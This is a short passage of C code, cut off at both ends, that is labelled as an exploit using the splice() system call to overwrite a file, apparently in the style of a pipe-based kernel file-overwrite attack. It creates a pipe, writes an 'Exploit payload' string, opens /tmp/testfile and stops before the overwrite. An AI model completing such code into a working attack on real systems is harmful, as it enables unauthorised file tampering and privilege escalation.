    return syscall(SYS_SPLICE, fd_in, off_in, fd_out, off_out, len, flags);
}

int main() {
    int pipefd[2];
    int fd;
    char buf[1024];

    // Create a pipe
    if (pipe(pipefd) == -1) {
        perror("pipe");
        return 1;
    }

    // Write to the pipe
    snprintf(buf, sizeof(buf), "Exploit payload\n");
    write(pipefd[1], buf, strlen(buf));

    // Create a file to overwrite
    fd = open("/tmp/testfile", O_RDWR);
    if (fd == -1) {
        perror("open");
        return 1;
    }

    // Exploit: Use splice() to overwrite the file
